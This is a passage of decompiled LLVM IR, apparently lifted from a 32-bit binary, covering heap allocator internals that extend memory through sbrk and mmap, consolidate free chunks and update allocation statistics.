dec_label_pc_8054179:                             ; preds = %dec_label_pc_805415e
  %v1_8054179 = add i32 %v3_805415e, 4
  %v2_8054179 = inttoptr i32 %v1_8054179 to i32*
  %v3_8054179 = load i32, i32* %v2_8054179, align 4
  store i32 %v3_8054179, i32* %edx.global-to-local, align 4
  %v1_805417c = add i32 %v3_805415e, 12
  %v2_805417c = inttoptr i32 %v1_805417c to i32*
  %v3_805417c = load i32, i32* %v2_805417c, align 4
  store i32 %v3_805417c, i32* %eax.global-to-local, align 4
  %v1_805417f = and i32 %v3_8054179, -4
  store i32 %v1_805417f, i32* @edx, align 4
  %v5_8054184 = sub i32 %v1_805417f, %v1_805427e
  store i32 %v5_8054184, i32* %esi.global-to-local, align 4
  store i32 %v3_805417c, i32* %v2_805415e, align 4
  %v0_805418b = load i32, i32* %ebx.global-to-local, align 4
  %v1_805418b = load i32, i32* %eax.global-to-local, align 4
  %v2_805418b = add i32 %v1_805418b, 8
  %v3_805418b = inttoptr i32 %v2_805418b to i32*
  store i32 %v0_805418b, i32* %v3_805418b, align 4
  %v0_805418e = load i32, i32* %esi.global-to-local, align 4
  %tmp138 = icmp ult i32 %v0_805418e, 16
  %v0_8054193 = load i32, i32* @ecx, align 4
  br i1 %tmp138, label %dec_label_pc_8054193, label %dec_label_pc_805419a

dec_label_pc_8054193:                             ; preds = %dec_label_pc_8054179
  %v1_8054193 = load i32, i32* @edx, align 4
  %v2_8054193 = add i32 %v0_8054193, 4
  %v3_8054193 = add i32 %v2_8054193, %v1_8054193
  %v4_8054193 = inttoptr i32 %v3_8054193 to i32*
  %v5_8054193 = load i32, i32* %v4_8054193, align 4
  %v6_8054193 = or i32 %v5_8054193, 1
  store i32 %v6_8054193, i32* %v4_8054193, align 4
  br label %dec_label_pc_80541e1

dec_label_pc_805419a:                             ; preds = %dec_label_pc_8054179
  %v2_805419e = add i32 %v0_8054193, %v1_805427e
  store i32 %v2_805419e, i32* %eax.global-to-local, align 4
  %v1_80541a7 = load i32, i32* @ebp, align 4
  %v2_80541a7 = add i32 %v1_80541a7, 8
  %v3_80541a7 = inttoptr i32 %v2_80541a7 to i32*
  store i32 %v2_805419e, i32* %v3_80541a7, align 4
  %v0_80541aa = load i32, i32* %eax.global-to-local, align 4
  %v1_80541aa = load i32, i32* @ebp, align 4
  %v2_80541aa = add i32 %v1_80541aa, 12
  %v3_80541aa = inttoptr i32 %v2_80541aa to i32*
  store i32 %v0_80541aa, i32* %v3_80541aa, align 4
  %v0_80541ad = load i32, i32* %eax.global-to-local, align 4
  %v1_80541ad = add i32 %v0_80541ad, 8
  %v2_80541ad = inttoptr i32 %v1_80541ad to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80541ad, align 4
  %v0_80541b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80541b4 = add i32 %v0_80541b4, 12
  %v2_80541b4 = inttoptr i32 %v1_80541b4 to i32*
  store i32 ptrtoint (i32* @global_var_8065834.961 to i32), i32* %v2_80541b4, align 4
  %v0_80541bb = load i32, i32* @global_var_8065830.960, align 16
  %v4_80541c1 = load i32, i32* %eax.global-to-local, align 4
  %v5_80541c1 = select i1 %v8_8053f27, i32 %v4_80541c1, i32 %v0_80541bb
  %v4_80541c4 = or i32 %v1_805427e, 1
  store i32 %v5_80541c1, i32* @global_var_8065830.960, align 16
  %v0_80541cf = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_80541c4, i32* %ebx.global-to-local, align 4
  %v1_80541d5 = or i32 %v0_80541cf, 1
  store i32 %v1_80541d5, i32* @edx, align 4
  %v3_80541d8 = add i32 %v0_80541cf, %v4_80541c1
  %v4_80541d8 = inttoptr i32 %v3_80541d8 to i32*
  store i32 %v0_80541cf, i32* %v4_80541d8, align 4
  %v0_80541db = load i32, i32* %ebx.global-to-local, align 4
  %v1_80541db = load i32, i32* @ecx, align 4
  %v2_80541db = add i32 %v1_80541db, 4
  %v3_80541db = inttoptr i32 %v2_80541db to i32*
  store i32 %v0_80541db, i32* %v3_80541db, align 4
  %v0_80541de = load i32, i32* @edx, align 4
  %v1_80541de = load i32, i32* %eax.global-to-local, align 4
  %v2_80541de = add i32 %v1_80541de, 4
  %v3_80541de = inttoptr i32 %v2_80541de to i32*
  store i32 %v0_80541de, i32* %v3_80541de, align 4
  br label %dec_label_pc_80541e1

dec_label_pc_80541e1:                             ; preds = %dec_label_pc_80542d5, %dec_label_pc_8054193, %dec_label_pc_805419a
  %v0_80541e1 = load i32, i32* @ecx, align 4
  %v1_80541e1 = add i32 %v0_80541e1, 8
  store i32 %v1_80541e1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054609

dec_label_pc_80541e9.loopexit:                    ; preds = %dec_label_pc_805412e
  br label %dec_label_pc_80541e9

dec_label_pc_80541e9:                             ; preds = %dec_label_pc_80541e9.loopexit, %dec_label_pc_8053ee9, %dec_label_pc_8053ef1
  %v0_80541e9 = load i32, i32* @global_var_806582c.959, align 4
  store i32 %v0_80541e9, i32* @ebx, align 4
  store i32 %v1_805427e, i32* %esi.global-to-local, align 4
  %v1_80541f3 = add i32 %v0_80541e9, 4
  %v2_80541f3 = inttoptr i32 %v1_80541f3 to i32*
  %v3_80541f3 = load i32, i32* %v2_80541f3, align 4
  %v1_80541f6 = add i32 %v1_805427e, 16
  store i32 %v1_80541f6, i32* @esi, align 4
  %v1_80541fd = and i32 %v3_80541f3, -4
  store i32 %v1_80541fd, i32* %ecx.global-to-local, align 4
  %v7_8054200 = icmp ult i32 %v1_80541fd, %v1_80541f6
  br i1 %v7_8054200, label %dec_label_pc_8054220, label %dec_label_pc_8054204

dec_label_pc_8054204:                             ; preds = %dec_label_pc_80541e9
  %v2_8054208 = add i32 %v0_80541e9, %v1_805427e
  store i32 %v2_8054208, i32* @edx, align 4
  %v1_805420b = or i32 %v1_805427e, 1
  store i32 %v1_805420b, i32* %eax.global-to-local, align 4
  store i32 %v2_8054208, i32* @global_var_806582c.959, align 4
  store i32 %v1_805420b, i32* %v2_80541f3, align 4
  %v0_8054217 = load i32, i32* %ecx.global-to-local, align 4
  %v5_8054217 = sub i32 %v0_8054217, %v1_805427e
  store i32 %v5_8054217, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054599

dec_label_pc_8054220:                             ; preds = %dec_label_pc_80541e9
  %v0_8054220 = load i8, i8* @global_var_8065800.958, align 2048
  %v1_8054220 = and i8 %v0_8054220, 2
  %v2_8054220 = icmp eq i8 %v1_8054220, 0
  %v0_8054227 = load i32, i32* @global_var_8065b5c.964, align 4
  store i32 %v0_8054227, i32* %edx.global-to-local, align 4
  br i1 %v2_8054220, label %dec_label_pc_8054254, label %dec_label_pc_805422f

dec_label_pc_805422f:                             ; preds = %dec_label_pc_8054220
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* %stack_var_-92, align 4
  %v2_8054237 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8065800.958 to i32*))
  store i32 ptrtoint (i8* @global_var_8065800.958 to i32), i32* @ebx, align 4
  %v1_8054241 = add i32 %v1_805427e, -7
  store i32 %v1_8054241, i32* %eax.global-to-local, align 4
  store i32 %v1_8054241, i32* %stack_var_-92, align 4
  %v1_8054245 = call i32 @malloc(i32 %v1_8054241)
  store i32 %v1_8054245, i32* %eax.global-to-local, align 4
  store i32 %v1_8054245, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054609

dec_label_pc_8054254:                             ; preds = %dec_label_pc_8054220
  store i32 %v1_805427e, i32* @ebx, align 4
  %v1_8054258 = add i32 %v0_8054227, -1
  store i32 %v1_8054258, i32* @ecx, align 4
  %v1_805425b = load i32, i32* @global_var_8065b4c.965, align 4
  %v7_805425b = icmp ult i32 %v1_805427e, %v1_805425b
  br i1 %v7_805425b, label %dec_label_pc_8054336, label %dec_label_pc_805426b

dec_label_pc_805426b:                             ; preds = %dec_label_pc_8054254
  %v0_805426b = load i32, i32* @global_var_8065b50.966, align 16
  store i32 %v0_805426b, i32* %eax.global-to-local, align 4
  %v1_8054270 = load i32, i32* @global_var_8065b54.967, align 4
  %v5_8054276 = icmp slt i32 %v0_805426b, %v1_8054270
  br i1 %v5_8054276, label %dec_label_pc_805427c, label %dec_label_pc_8054336

dec_label_pc_805427c:                             ; preds = %dec_label_pc_805426b
  %v2_805427e = add i32 %v1_805427e, 10
  %v3_805427e = add i32 %v2_805427e, %v0_8054227
  %v1_8054282 = sub i32 0, %v0_8054227
  store i32 %v1_8054282, i32* %eax.global-to-local, align 4
  %v2_8054284 = and i32 %v3_805427e, %v1_8054282
  store i32 %v2_8054284, i32* @ebx, align 4
  %tmp139 = icmp ugt i32 %v2_8054284, %v1_805427e
  br i1 %tmp139, label %dec_label_pc_8054290, label %dec_label_pc_8054336

dec_label_pc_8054290:                             ; preds = %dec_label_pc_805427c
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805429d = call i32 @mmap(i32 0, i32 %v2_8054284, i32 3, i32 34, i32 0, i32 0, i32 %v1_8054258, i32 %v1_8054258)
  store i32 %v8_805429d, i32* %eax.global-to-local, align 4
  %v10_80542a5 = icmp eq i32 %v8_805429d, -1
  store i32 %v8_805429d, i32* %edx.global-to-local, align 4
  br i1 %v10_80542a5, label %dec_label_pc_8054290.dec_label_pc_8054336_crit_edge, label %dec_label_pc_80542b0

dec_label_pc_8054290.dec_label_pc_8054336_crit_edge: ; preds = %dec_label_pc_8054290
  %v0_8054336.pre = load i32, i32* @global_var_806582c.959, align 4
  br label %dec_label_pc_8054336

dec_label_pc_80542b0:                             ; preds = %dec_label_pc_8054290
  %v1_80542b2 = urem i32 %v8_805429d, 8
  %v2_80542b2 = icmp eq i32 %v1_80542b2, 0
  store i32 %v1_80542b2, i32* %ecx.global-to-local, align 4
  br i1 %v2_80542b2, label %dec_label_pc_80542cb, label %dec_label_pc_80542b7

dec_label_pc_80542b7:                             ; preds = %dec_label_pc_80542b0
  %v0_80542bc = load i32, i32* @ebx, align 4
  %v2_80542be = sub nsw i32 8, %v1_80542b2
  store i32 %v2_80542be, i32* %eax.global-to-local, align 4
  %v2_80542c0 = add i32 %v2_80542be, %v8_805429d
  store i32 %v2_80542c0, i32* @ecx, align 4
  %v2_80542c3 = sub i32 %v0_80542bc, %v2_80542be
  store i32 %v2_80542c3, i32* %esi.global-to-local, align 4
  %v2_80542c5 = inttoptr i32 %v2_80542c0 to i32*
  store i32 %v2_80542be, i32* %v2_80542c5, align 4
  br label %dec_label_pc_80542d5

dec_label_pc_80542cb:                             ; preds = %dec_label_pc_80542b0
  store i32 %v8_805429d, i32* @ecx, align 4
  %v1_80542cd = inttoptr i32 %v8_805429d to i32*
  store i32 0, i32* %v1_80542cd, align 4
  br label %dec_label_pc_80542d5

dec_label_pc_80542d5:                             ; preds = %dec_label_pc_80542b7, %dec_label_pc_80542cb
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_80542b7 ], [ @ebx, %dec_label_pc_80542cb ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_80542d5 = or i32 %storemerge, 2
  %v1_80542d8 = load i32, i32* @ecx, align 4
  %v2_80542d8 = add i32 %v1_80542d8, 4
  %v3_80542d8 = inttoptr i32 %v2_80542d8 to i32*
  store i32 %v1_80542d5, i32* %v3_80542d8, align 4
  %v0_80542db = load i32, i32* @global_var_8065b50.966, align 16
  %v0_80542e0 = load i32, i32* @global_var_8065b70.968, align 16
  %v1_80542e6 = add i32 %v0_80542db, 1
  %v1_80542e7 = load i32, i32* @global_var_8065b58.969, align 8
  %v2_80542e7 = sub i32 %v1_80542e6, %v1_80542e7
  %v8_80542e7 = xor i32 %v1_80542e7, %v1_80542e6
  %v9_80542e7 = xor i32 %v2_80542e7, %v1_80542e6
  %v10_80542e7 = and i32 %v9_80542e7, %v8_80542e7
  %v11_80542e7 = icmp slt i32 %v10_80542e7, 0
  %v12_80542e7 = icmp eq i32 %v2_80542e7, 0
  %v13_80542e7 = icmp slt i32 %v2_80542e7, 0
  store i32 %v1_80542e6, i32* @global_var_8065b50.966, align 16
  %v3_80542f2 = icmp ne i1 %v13_80542e7, %v11_80542e7
  %v4_80542f2 = or i1 %v12_80542e7, %v3_80542f2
  %v7_80542f2 = select i1 %v4_80542f2, i32 %v1_80542e7, i32 %v1_80542e6
  store i32 %v7_80542f2, i32* @global_var_8065b58.969, align 8
  %v0_80542fe = load i32, i32* @global_var_8065b64.970, align 4
  %v1_8054303 = load i32, i32* @ebx, align 4
  %v2_8054303 = add i32 %v1_8054303, %v0_80542fe
  store i32 %v2_8054303, i32* @global_var_8065b64.970, align 4
  %tmp86 = icmp ule i32 %v2_8054303, %v0_80542e0
  %v5_8054310 = select i1 %tmp86, i32 %v0_80542e0, i32 %v2_8054303
  store i32 %v5_8054310, i32* @edx, align 4
  %v1_8054313 = load i32, i32* @global_var_8065b68.971, align 8
  %v2_8054313 = add i32 %v1_8054313, %v2_8054303
  store i32 %v5_8054310, i32* @global_var_8065b70.968, align 16
  %v1_805431f = load i32, i32* @global_var_8065b74.972, align 4
  %tmp140 = icmp ule i32 %v2_8054313, %v1_805431f
  %v5_8054325 = select i1 %tmp140, i32 %v1_805431f, i32 %v2_8054313
  store i32 %v5_8054325, i32* %eax.global-to-local, align 4
  store i32 %v5_8054325, i32* @global_var_8065b74.972, align 4
  br label %dec_label_pc_80541e1

dec_label_pc_8054336:                             ; preds = %dec_label_pc_805427c, %dec_label_pc_8054290.dec_label_pc_8054336_crit_edge, %dec_label_pc_805426b, %dec_label_pc_8054254
  %v0_8054336 = phi i32 [ %v0_8054336.pre, %dec_label_pc_8054290.dec_label_pc_8054336_crit_edge ], [ %v0_80541e9, %dec_label_pc_805426b ], [ %v0_80541e9, %dec_label_pc_805427c ], [ %v0_80541e9, %dec_label_pc_8054254 ]
  store i32 %v0_8054336, i32* %eax.global-to-local, align 4
  %v1_805433f = add i32 %v0_8054336, 4
  %v2_805433f = inttoptr i32 %v1_805433f to i32*
  %v3_805433f = load i32, i32* %v2_805433f, align 4
  %v1_8054346 = and i32 %v3_805433f, -4
  %v2_8054346 = icmp eq i32 %v1_8054346, 0
  store i32 %v1_8054346, i32* @ebp, align 4
  %v1_805434c = load i32, i32* @global_var_8065b48.973, align 8
  %v0_8054356 = load i8, i8* @global_var_8065b60.974, align 32
  %v1_8054356 = urem i8 %v0_8054356, 2
  %v2_8054356 = icmp eq i8 %v1_8054356, 0
  %v1_805435d = icmp eq i1 %v2_8054356, false
  %v1_8054346.op = sub i32 0, %v1_8054346
  %v2_8054354.neg = select i1 %v1_805435d, i32 %v1_8054346.op, i32 0
  %v2_805434c = add i32 %v1_8054258, %v1_80541f6
  %v4_805435d = add i32 %v2_805434c, %v1_805434c
  %v5_8054364 = add i32 %v4_805435d, %v2_8054354.neg
  store i32 %v5_8054364, i32* %eax.global-to-local, align 4
  %v1_8054368 = sub i32 0, %v0_8054227
  store i32 %v1_8054368, i32* @edx, align 4
  %v2_805436c = and i32 %v5_8054364, %v1_8054368
  store i32 %v2_805436c, i32* @esi, align 4
  %tmp87 = icmp slt i32 %v2_805436c, 1
  br i1 %tmp87, label %dec_label_pc_805438a, label %dec_label_pc_8054374

dec_label_pc_8054374:                             ; preds = %dec_label_pc_8054336
  store i32 %v2_805436c, i32* %stack_var_-92, align 4
  %v1_8054378 = call i32 @__GI_sbrk(i32 %v2_805436c)
  store i32 %v1_8054378, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  %v10_8054383 = icmp eq i32 %v1_8054378, -1
  store i32 %v1_8054378, i32* @ebx, align 4
  %v1_8054388 = icmp eq i1 %v10_8054383, false
  br i1 %v1_8054388, label %dec_label_pc_80543e1, label %dec_label_pc_8054374.dec_label_pc_805438a_crit_edge

dec_label_pc_8054374.dec_label_pc_805438a_crit_edge: ; preds = %dec_label_pc_8054374
  %v0_805438a.pre = load i8, i8* @global_var_8065b60.974, align 32
  br label %dec_label_pc_805438a

dec_label_pc_805438a:                             ; preds = %dec_label_pc_8054374.dec_label_pc_805438a_crit_edge, %dec_label_pc_8054336
  %v0_80543b7 = phi i32 [ -1, %dec_label_pc_8054374.dec_label_pc_805438a_crit_edge ], [ %v1_8054368, %dec_label_pc_8054336 ]
  %v0_805438a = phi i8 [ %v0_805438a.pre, %dec_label_pc_8054374.dec_label_pc_805438a_crit_edge ], [ %v0_8054356, %dec_label_pc_8054336 ]
  %v1_805438a = urem i8 %v0_805438a, 2
  %v2_805438a = icmp eq i8 %v1_805438a, 0
  br i1 %v2_805438a, label %dec_label_pc_805438a.dec_label_pc_805439f_crit_edge, label %dec_label_pc_8054393

dec_label_pc_805438a.dec_label_pc_805439f_crit_edge: ; preds = %dec_label_pc_805438a
  %v0_805439f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805439f

dec_label_pc_8054393:                             ; preds = %dec_label_pc_805438a
  %v2_8054397 = add i32 %v1_8054346, %v1_8054258
  store i32 %v2_8054397, i32* %eax.global-to-local, align 4
  %v0_8054399 = load i32, i32* @esi, align 4
  %v2_8054399 = add i32 %v0_8054399, %v2_8054397
  %v5_805439b = and i32 %v2_8054399, %v1_8054368
  store i32 %v5_805439b, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805439f

dec_label_pc_805439f:                             ; preds = %dec_label_pc_805438a.dec_label_pc_805439f_crit_edge, %dec_label_pc_8054393
  %v3_80543aa = phi i32 [ %v0_805439f.pre, %dec_label_pc_805438a.dec_label_pc_805439f_crit_edge ], [ %v5_805439b, %dec_label_pc_8054393 ]
  store i32 1048576, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_80543aa, 1048576
  %v5_80543aa = select i1 %tmp88, i32 1048576, i32 %v3_80543aa
  store i32 %v5_80543aa, i32* @esi, align 4
  %tmp141 = icmp ugt i32 %v5_80543aa, %v1_805427e
  br i1 %tmp141, label %dec_label_pc_80543b7, label %dec_label_pc_80545fc

dec_label_pc_80543b7:                             ; preds = %dec_label_pc_805439f
  store i32 0, i32* %stack_var_-92, align 4
  %v8_80543c4 = call i32 @mmap(i32 0, i32 %v5_80543aa, i32 3, i32 34, i32 0, i32 0, i32 %v0_80543b7, i32 %v0_80543b7)
  store i32 %v8_80543c4, i32* %eax.global-to-local, align 4
  %v10_80543cc = icmp eq i32 %v8_80543c4, -1
  store i32 %v8_80543c4, i32* @ebx, align 4
  br i1 %v10_80543cc, label %dec_label_pc_80545fc, label %dec_label_pc_80543d7

dec_label_pc_80543d7:                             ; preds = %dec_label_pc_80543b7
  %v0_80543d7 = load i8, i8* @global_var_8065b60.974, align 1
  %v2_80543d7 = and i8 %v0_80543d7, -2
  store i8 %v2_80543d7, i8* @global_var_8065b60.974, align 32
  %v1_80543de = load i32, i32* @esi, align 4
  %v2_80543de = add i32 %v1_80543de, %v8_80543c4
  store i32 %v2_80543de, i32* @edx, align 4
  br label %dec_label_pc_80543e1

dec_label_pc_80543e1:                             ; preds = %dec_label_pc_8054374, %dec_label_pc_80543d7
  %v0_80544a8 = phi i32 [ -1, %dec_label_pc_8054374 ], [ %v2_80543de, %dec_label_pc_80543d7 ]
  %v0_80544b6 = phi i32 [ %v1_8054378, %dec_label_pc_8054374 ], [ %v8_80543c4, %dec_label_pc_80543d7 ]
  %v10_80543e1 = icmp eq i32 %v0_80544b6, -1
  br i1 %v10_80543e1, label %dec_label_pc_80545fc, label %dec_label_pc_80543ea

dec_label_pc_80543ea:                             ; preds = %dec_label_pc_80543e1
  %v0_80543ee = load i32, i32* @global_var_8065b68.971, align 8
  %v1_80543ee = load i32, i32* @esi, align 4
  %v2_80543ee = add i32 %v1_80543ee, %v0_80543ee
  store i32 %v2_80543ee, i32* @global_var_8065b68.971, align 8
  %v2_80543f4 = add i32 %v1_8054346, %v0_8054336
  store i32 %v2_80543f4, i32* %ecx.global-to-local, align 4
  %v2_80543f6 = sub i32 %v0_80544b6, %v2_80543f4
  %v7_80543f6 = icmp ult i32 %v0_80544b6, %v2_80543f4
  %v12_80543f6 = icmp eq i32 %v2_80543f6, 0
  %v1_80543f8 = icmp eq i1 %v12_80543f6, false
  br i1 %v1_80543f8, label %dec_label_pc_8054411, label %dec_label_pc_80543fa

dec_label_pc_80543fa:                             ; preds = %dec_label_pc_80543ea
  %v10_80543fa = icmp eq i32 %v0_80544a8, -1
  %v1_80543fd = icmp eq i1 %v10_80543fa, false
  br i1 %v1_80543fd, label %dec_label_pc_8054411, label %dec_label_pc_80543ff

dec_label_pc_80543ff:                             ; preds = %dec_label_pc_80543fa
  store i32 %v0_8054336, i32* %ecx.global-to-local, align 4
  %v2_8054403 = add i32 %v1_80543ee, %v1_8054346
  %v1_8054406 = or i32 %v2_8054403, 1
  store i32 %v1_8054406, i32* %eax.global-to-local, align 4
  store i32 %v1_8054406, i32* %v2_805433f, align 4
  br label %dec_label_pc_805453e

dec_label_pc_8054411:                             ; preds = %dec_label_pc_80543fa, %dec_label_pc_80543ea
  %v0_8054411 = load i8, i8* @global_var_8065b60.974, align 1
  %v1_8054411 = sext i8 %v0_8054411 to i32
  store i32 %v1_8054411, i32* %eax.global-to-local, align 4
  %v2_8054416 = urem i8 %v0_8054411, 2
  %v3_8054416 = icmp eq i8 %v2_8054416, 0
  br i1 %v3_8054416, label %dec_label_pc_805442a, label %dec_label_pc_805441a

dec_label_pc_805441a:                             ; preds = %dec_label_pc_8054411
  br i1 %v2_8054346, label %dec_label_pc_805442a, label %dec_label_pc_805441e

dec_label_pc_805441e:                             ; preds = %dec_label_pc_805441a
  %v1_8054420 = icmp eq i1 %v7_80543f6, false
  br i1 %v1_8054420, label %dec_label_pc_805442a, label %dec_label_pc_8054422

dec_label_pc_8054422:                             ; preds = %dec_label_pc_805441e
  %v1_8054422 = and i32 %v1_8054411, -2
  %v4_8054422 = trunc i32 %v1_8054422 to i8
  store i32 %v1_8054422, i32* %eax.global-to-local, align 4
  store i8 %v4_8054422, i8* @global_var_8065b60.974, align 32
  br label %dec_label_pc_805442a

dec_label_pc_805442a:                             ; preds = %dec_label_pc_805441e, %dec_label_pc_805441a, %dec_label_pc_8054411, %dec_label_pc_8054422
  %v0_805442a = phi i8 [ %v0_8054411, %dec_label_pc_805441e ], [ %v0_8054411, %dec_label_pc_805441a ], [ %v0_8054411, %dec_label_pc_8054411 ], [ %v4_8054422, %dec_label_pc_8054422 ]
  %v1_805442a = urem i8 %v0_805442a, 2
  %v2_805442a = icmp eq i8 %v1_805442a, 0
  br i1 %v2_805442a, label %dec_label_pc_80544a8, label %dec_label_pc_8054433

dec_label_pc_8054433:                             ; preds = %dec_label_pc_805442a
  br i1 %v2_8054346, label %dec_label_pc_8054441, label %dec_label_pc_8054437

dec_label_pc_8054437:                             ; preds = %dec_label_pc_8054433
  store i32 %v2_80543f6, i32* %eax.global-to-local, align 4
  %v2_805443b = add i32 %v2_80543ee, %v2_80543f6
  store i32 %v2_805443b, i32* @global_var_8065b68.971, align 8
  br label %dec_label_pc_8054441

dec_label_pc_8054441:                             ; preds = %dec_label_pc_8054433, %dec_label_pc_8054437
  %v1_8054443 = urem i32 %v0_80544b6, 8
  %v2_8054443 = icmp eq i32 %v1_8054443, 0
  store i32 %v1_8054443, i32* %edx.global-to-local, align 4
  %v1_8054446 = icmp eq i1 %v2_8054443, false
  br i1 %v1_8054446, label %dec_label_pc_805444e, label %dec_label_pc_8054448

dec_label_pc_8054448:                             ; preds = %dec_label_pc_8054441
  store i32 %v0_80544b6, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054458

dec_label_pc_805444e:                             ; preds = %dec_label_pc_8054441
  %v2_8054453 = sub nsw i32 8, %v1_8054443
  store i32 %v2_8054453, i32* %eax.global-to-local, align 4
  %v2_8054455 = add i32 %v2_8054453, %v0_80544b6
  store i32 %v2_8054455, i32* @edi, align 4
  br label %dec_label_pc_8054458

dec_label_pc_8054458:                             ; preds = %dec_label_pc_8054448, %dec_label_pc_805444e
  %v0_8054465 = phi i32 [ 0, %dec_label_pc_8054448 ], [ %v2_8054453, %dec_label_pc_805444e ]
  %v2_8054458 = add i32 %v1_80543ee, %v0_80544b6
  %v2_8054465 = add i32 %v0_8054465, %v1_8054346
  store i32 %v2_8054465, i32* %ecx.global-to-local, align 4
  %v2_8054468 = add i32 %v2_8054465, %v2_8054458
  store i32 %v2_8054468, i32* %edx.global-to-local, align 4
  %v2_805446a = add i32 %v2_8054468, %v1_8054258
  %v5_805446d = and i32 %v2_805446a, %v1_8054368
  %v2_8054474 = sub i32 %v5_805446d, %v2_8054468
  store i32 %v2_8054474, i32* %eax.global-to-local, align 4
  %v2_8054476 = add i32 %v2_8054474, %v2_8054465
  store i32 %v2_8054476, i32* @esi, align 4
  store i32 %v2_8054476, i32* %stack_var_-92, align 4
  %v1_805447a = call i32 @__GI_sbrk(i32 %v2_8054476)
  store i32 %v1_805447a, i32* %eax.global-to-local, align 4
  %v10_8054482 = icmp eq i32 %v1_805447a, -1
  store i32 %v1_805447a, i32* %edx.global-to-local, align 4
  %v1_8054487 = icmp eq i1 %v10_8054482, false
  br i1 %v1_8054487, label %dec_label_pc_8054497, label %dec_label_pc_8054489

dec_label_pc_8054489:                             ; preds = %dec_label_pc_8054458
  store i32 0, i32* %stack_var_-92, align 4
  %v1_805448e = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_805448e, i32* %eax.global-to-local, align 4
  store i32 %v1_805448e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544cb

dec_label_pc_8054497:                             ; preds = %dec_label_pc_8054458
  %v1_8054497 = load i32, i32* @ebx, align 4
  %v7_8054497 = icmp ult i32 %v1_805447a, %v1_8054497
  %v1_8054499 = icmp eq i1 %v7_8054497, false
  br i1 %v1_8054499, label %dec_label_pc_80544d0, label %dec_label_pc_805449b

dec_label_pc_805449b:                             ; preds = %dec_label_pc_8054497
  %v0_805449b = load i8, i8* @global_var_8065b60.974, align 1
  %v2_805449b = and i8 %v0_805449b, -2
  store i8 %v2_805449b, i8* @global_var_8065b60.974, align 32
  store i32 %v2_8054458, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80544af

dec_label_pc_80544a8:                             ; preds = %dec_label_pc_805442a
  %v10_80544a8 = icmp eq i32 %v0_80544a8, -1
  br i1 %v10_80544a8, label %dec_label_pc_80544b3, label %dec_label_pc_80544ad

dec_label_pc_80544ad:                             ; preds = %dec_label_pc_80544a8
  store i32 %v0_80544b6, i32* @edi, align 4
  br label %dec_label_pc_80544af

dec_label_pc_80544af:                             ; preds = %dec_label_pc_805449b, %dec_label_pc_80544ad
  %v0_80544d047 = phi i32 [ %v2_8054458, %dec_label_pc_805449b ], [ %v0_80544a8, %dec_label_pc_80544ad ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80544d0

dec_label_pc_80544b3:                             ; preds = %dec_label_pc_80544a8
  store i32 %v0_80544b6, i32* @edi, align 4
  store i32 0, i32* %stack_var_-92, align 4
  %v1_80544ba = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_80544ba, i32* %edx.global-to-local, align 4
  %v1_80544c1 = load i32, i32* @ebx, align 4
  %v2_80544c1 = sub i32 %v1_80544ba, %v1_80544c1
  %v1_80544c3 = load i32, i32* @esi, align 4
  %v2_80544c3 = sub i32 %v2_80544c1, %v1_80544c3
  store i32 %v2_80544c3, i32* %eax.global-to-local, align 4
  %v0_80544c5 = load i32, i32* @global_var_8065b68.971, align 8
  %v2_80544c5 = add i32 %v0_80544c5, %v2_80544c3
  store i32 %v2_80544c5, i32* @global_var_8065b68.971, align 8
  br label %dec_label_pc_80544cb

dec_label_pc_80544cb:                             ; preds = %dec_label_pc_8054489, %dec_label_pc_80544b3
  %v0_80544d046 = phi i32 [ %v1_805448e, %dec_label_pc_8054489 ], [ %v1_80544ba, %dec_label_pc_80544b3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_80544d0

dec_label_pc_80544d0:                             ; preds = %dec_label_pc_8054497, %dec_label_pc_80544af, %dec_label_pc_80544cb
  %v0_80544d5 = phi i32 [ %v1_805447a, %dec_label_pc_8054497 ], [ %v0_80544d047, %dec_label_pc_80544af ], [ %v0_80544d046, %dec_label_pc_80544cb ]
  %v10_80544d0 = icmp eq i32 %v0_80544d5, -1
  br i1 %v10_80544d0, label %dec_label_pc_805453e, label %dec_label_pc_80544d5

dec_label_pc_80544d5:                             ; preds = %dec_label_pc_80544d0
  %v1_80544d5 = load i32, i32* @edi, align 4
  %v2_80544d5 = sub i32 %v0_80544d5, %v1_80544d5
  store i32 %v2_80544d5, i32* %edx.global-to-local, align 4
  %v1_80544d7 = load i32, i32* @esi, align 4
  %v2_80544d7 = add i32 %v1_80544d7, %v2_80544d5
  %v1_80544da = or i32 %v2_80544d7, 1
  store i32 %v1_80544da, i32* %eax.global-to-local, align 4
  store i32 %v1_80544d5, i32* @global_var_806582c.959, align 4
  %v2_80544e3 = add i32 %v1_80544d5, 4
  %v3_80544e3 = inttoptr i32 %v2_80544e3 to i32*
  store i32 %v1_80544da, i32* %v3_80544e3, align 4
  %v0_80544e6 = load i32, i32* @global_var_8065b68.971, align 8
  %v1_80544e6 = load i32, i32* @esi, align 4
  %v2_80544e6 = add i32 %v1_80544e6, %v0_80544e6
  store i32 %v2_80544e6, i32* @global_var_8065b68.971, align 8
  br i1 %v2_8054346, label %dec_label_pc_805453e, label %dec_label_pc_80544f0

dec_label_pc_80544f0:                             ; preds = %dec_label_pc_80544d5
  store i32 %v0_8054336, i32* %ecx.global-to-local, align 4
  %v1_80544f4 = add i32 %v1_8054346, -12
  %v1_80544f7 = and i32 %v1_80544f4, -8
  store i32 %v1_80544f7, i32* %eax.global-to-local, align 4
